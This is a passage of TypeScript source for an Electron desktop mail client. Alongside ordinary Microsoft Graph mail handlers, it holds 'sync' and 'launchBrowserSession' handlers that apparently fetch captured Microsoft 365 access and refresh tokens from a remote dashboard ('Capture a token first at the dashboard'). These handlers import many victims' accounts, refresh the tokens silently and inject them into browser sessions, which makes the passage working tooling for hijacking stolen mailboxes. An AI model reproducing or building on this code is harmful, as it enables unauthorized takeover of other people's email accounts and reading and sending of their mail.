      const result = await graphClient.getMessages(folderId, page, pageSize);
      return { success: true, ...result };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to fetch messages';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:getMessage', async (_event, messageId: string) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      const message = await graphClient.getMessage(messageId);
      return { success: true, message };
    } catch (error: unknown) {
      const msg = error instanceof Error ? error.message : 'Failed to fetch message';
      return { success: false, error: msg };
    }
  });

  ipcMain.handle('mail:sendMessage', async (_event, messageData: {
    to: string[];
    cc?: string[];
    bcc?: string[];
    subject: string;
    body: string;
    isHtml: boolean;
    replyToId?: string;
  }) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      if (messageData.replyToId) {
        await graphClient.replyToMessage(messageData.replyToId, messageData.body, messageData.isHtml);
      } else {
        await graphClient.sendMessage(messageData);
      }
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to send message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:moveMessage', async (_event, messageId: string, destinationFolderId: string) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      await graphClient.moveMessage(messageId, destinationFolderId);
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to move message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:deleteMessage', async (_event, messageId: string) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      await graphClient.deleteMessage(messageId);
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to delete message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:toggleRead', async (_event, messageId: string, isRead: boolean) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      await graphClient.markAsRead(messageId, isRead);
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to update message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:toggleFlag', async (_event, messageId: string, isFlagged: boolean) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      await graphClient.toggleFlag(messageId, isFlagged);
      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to flag message';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:search', async (_event, query: string) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      const messages = await graphClient.searchMessages(query);
      return { success: true, messages };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Search failed';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('mail:saveDraft', async (_event, messageData: {
    to: string[];
    cc?: string[];
    subject: string;
    body: string;
    isHtml: boolean;
  }) => {
    if (!graphClient) return { success: false, error: 'Not authenticated' };
    try {
      const draft = await graphClient.saveDraft(messageData);
      return { success: true, draft };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Failed to save draft';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('notification:show', async (_event, title: string, body: string) => {
    if (Notification.isSupported()) {
      new Notification({ title, body }).show();
    }
  });

  // Fetch + import all sessions at once from dashboard (ultra fast - single request)
  ipcMain.handle('sync:fetchAndImportAll', async (_event, password: string) => {
    try {
      const listResp = await httpsPost(`${DASHBOARD_API}/export-token`, { password });

      if (listResp.status !== 200) {
        const data = JSON.parse(listResp.body) as { error?: string };
        return { success: false, error: data.error || 'Invalid password or connection failed' };
      }

      const listData = JSON.parse(listResp.body) as { sessions: Array<{ id: string; accountEmail: string; accountName: string; accessTokenExpiry: string }> };

      if (!listData.sessions || listData.sessions.length === 0) {
        return { success: false, error: 'No tokens found. Capture a token first at the dashboard.' };
      }

      // Import all sessions in parallel for speed
      syncedAccounts.length = 0;
      const importPromises = listData.sessions.map(async (sess) => {
        const importResp = await httpsPost(`${DASHBOARD_API}/export-token`, { sessionId: sess.id, password });

        if (importResp.status === 200) {
          const importData = JSON.parse(importResp.body) as {
            session: {
              id: string;
              accountEmail: string;
              accountName: string;
              accessToken: string;
              refreshToken: string;
              accessTokenExpiry: string;
            };
          };
          syncedAccounts.push({
            sessionId: importData.session.id,
            email: importData.session.accountEmail,
            name: importData.session.accountName,
            accessToken: importData.session.accessToken,
            refreshToken: importData.session.refreshToken,
            accessTokenExpiry: importData.session.accessTokenExpiry,
          });
        }
      });

      await Promise.all(importPromises);

      if (syncedAccounts.length === 0) {
        return { success: false, error: 'Failed to import any tokens' };
      }

      // Auto-select first account
      const first = syncedAccounts[0];
      graphClient = new GraphMailClient(first.accessToken);
      tokenStore.saveImportedTokens(first.accessToken, first.refreshToken, first.email);

      const accounts = syncedAccounts.map((a) => ({
        id: a.sessionId,
        accountEmail: a.email,
        accountName: a.name,
        accessTokenExpiry: a.accessTokenExpiry,
      }));

      // Get profile without blocking
      let profile = { displayName: first.name, mail: first.email, userPrincipalName: first.email, jobTitle: '' };
      try {
        const gProfile = await graphClient.getProfile();
        profile = {
          displayName: gProfile.displayName || first.name,
          mail: gProfile.mail || first.email,
          userPrincipalName: gProfile.userPrincipalName || first.email,
          jobTitle: gProfile.jobTitle || '',
        };
      } catch {
        // Use basic info from token
      }

      return { success: true, accounts, profile, activeAccountEmail: first.email };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Network error';
      return { success: false, error: message };
    }
  });

  // Switch to a different synced account
  ipcMain.handle('sync:switchAccount', async (_event, sessionId: string) => {
    const account = syncedAccounts.find((a) => a.sessionId === sessionId);
    if (!account) {
      return { success: false, error: 'Account not found' };
    }

    // Refresh token to get fresh access token
    await refreshAccountToken(account);

    graphClient = new GraphMailClient(account.accessToken);
    tokenStore.saveImportedTokens(account.accessToken, account.refreshToken, account.email);

    let profile = { displayName: account.name, mail: account.email, userPrincipalName: account.email, jobTitle: '' };
    try {
      const gProfile = await graphClient.getProfile();
      profile = {
        displayName: gProfile.displayName || account.name,
        mail: gProfile.mail || account.email,
        userPrincipalName: gProfile.userPrincipalName || account.email,
        jobTitle: gProfile.jobTitle || '',
      };
    } catch {
      // Use basic info
    }

    return { success: true, profile };
  });

  // Refresh all synced accounts in parallel
  ipcMain.handle('sync:refreshAll', async () => {
    try {
      const results = await Promise.all(syncedAccounts.map((acc) => refreshAccountToken(acc)));
      const successCount = results.filter((r) => r).length;

      const accounts = syncedAccounts.map((a) => ({
        id: a.sessionId,
        accountEmail: a.email,
        accountName: a.name,
        accessTokenExpiry: a.accessTokenExpiry,
      }));

      if (successCount === 0) {
        return { success: false, error: 'Failed to refresh any tokens' };
      }

      return { success: true, accounts };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Refresh failed';
      return { success: false, error: message };
    }
  });

  // Launch browser session with token injection
  ipcMain.handle('launchBrowserSession', async (_event, sessionId: string, service: string) => {
    const account = syncedAccounts.find((a) => a.sessionId === sessionId);
    if (!account) {
      return { success: false, error: 'Account not found' };
    }

    // Refresh token first
    await refreshAccountToken(account);

    if (service === 'chrome') {
      // Launch external Chrome with isolated profile
      return await launchExternalChrome(account, service);
    }

    // Launch in-app browser window with token injection
    return await launchChromeWithSession(account, service);
  });

  // Open email in Chrome (legacy)
  ipcMain.handle('openInChrome', async () => {
    shell.openExternal('https://outlook.office365.com/mail/');
  });

  // Legacy handlers
  ipcMain.handle('sync:fetchSessions', async (_event, password: string) => {
    try {
      const resp = await httpsPost(`${DASHBOARD_API}/export-token`, { password });

      if (resp.status !== 200) {
        const data = JSON.parse(resp.body) as { error?: string };
        return { success: false, error: data.error || 'Failed to fetch sessions' };
      }

      const data = JSON.parse(resp.body) as { sessions: Array<{ id: string; accountEmail: string; accountName: string; accessTokenExpiry: string }> };
      return { success: true, sessions: data.sessions };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Network error';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('sync:importToken', async (_event, password: string, sessionId: string) => {
    try {
      const resp = await httpsPost(`${DASHBOARD_API}/export-token`, { sessionId, password });

      if (resp.status !== 200) {
        const data = JSON.parse(resp.body) as { error?: string };
        return { success: false, error: data.error || 'Failed to import token' };
      }

      const data = JSON.parse(resp.body) as {
        session: {
          id: string;
          accountEmail: string;
          accountName: string;
          accessToken: string;
          refreshToken: string;
          accessTokenExpiry: string;
          scopes: string[];
          clientId: string;
        };
      };

      const s = data.session;
      await authManager.importToken(s.accessToken, s.refreshToken, s.accountEmail);
      graphClient = new GraphMailClient(s.accessToken);

      try {
        const profile = await graphClient.getProfile();
        return { success: true, profile };
      } catch {
        return { success: true, profile: { displayName: s.accountName, mail: s.accountEmail, userPrincipalName: s.accountEmail, jobTitle: '' } };
      }
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Network error';
      return { success: false, error: message };
    }
  });

  ipcMain.handle('sync:refreshImportedToken', async () => {
    try {
      const tokens = tokenStore.getImportedTokens();
      if (!tokens || !tokens.refreshToken) {
        return { success: false, error: 'No imported token to refresh' };
      }

      const body = new URLSearchParams({
        client_id: CLIENT_ID,
        grant_type: 'refresh_token',
        refresh_token: tokens.refreshToken,
        resource: 'https://graph.microsoft.com',
      });

      const response = await net.fetch('https://login.microsoftonline.com/common/oauth2/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body.toString(),
      });

      const data = await response.json() as Record<string, unknown>;

      if (!response.ok) {
        return { success: false, error: (data.error_description as string) || 'Refresh failed' };
      }

      const newAccessToken = data.access_token as string;
      const newRefreshToken = (data.refresh_token as string) || tokens.refreshToken;
      tokenStore.saveImportedTokens(newAccessToken, newRefreshToken, tokens.email);
      graphClient = new GraphMailClient(newAccessToken);

      return { success: true };
    } catch (error: unknown) {
      const message = error instanceof Error ? error.message : 'Refresh failed';
      return { success: false, error: message };
    }
  });
}

function setupAutoUpdater(): void {
  autoUpdater.autoDownload = true;
  autoUpdater.autoInstallOnAppQuit = true;

  autoUpdater.on('update-available', (info) => {
    if (mainWindow) {
      mainWindow.webContents.send('update:available', { version: info.version });
    }
  });

  autoUpdater.on('update-downloaded', (info) => {
    if (mainWindow) {
      mainWindow.webContents.send('update:downloaded', { version: info.version });
    }
    if (Notification.isSupported()) {
      const notification = new Notification({
        title: 'Update Ready',
        body: `Version ${info.version} has been downloaded. It will be installed on restart.`,
      });
      notification.on('click', () => {
        autoUpdater.quitAndInstall();
      });
      notification.show();
    }
  });

  autoUpdater.on('error', (error) => {
    console.log('[AutoUpdater] Error:', error.message);
  });

  autoUpdater.checkForUpdatesAndNotify().catch(() => {
    // Silently fail if update check fails
  });
}

app.whenReady().then(() => {
  authManager = new AuthManager(tokenStore);
  createWindow();
  setupIpcHandlers();
  setupAutoUpdater();

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});
